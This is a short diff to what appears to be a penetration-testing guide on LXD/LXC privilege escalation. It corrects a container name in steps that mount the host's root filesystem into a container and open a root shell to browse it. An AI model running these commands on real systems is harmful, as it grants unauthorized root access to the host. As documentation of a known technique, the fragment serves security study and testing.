@@ -45,7 +45,7 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=t
 Execute the container:
 
 ```text
-lxc start test
+lxc start privesc
 lxc exec privesc /bin/sh
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted 
 ```
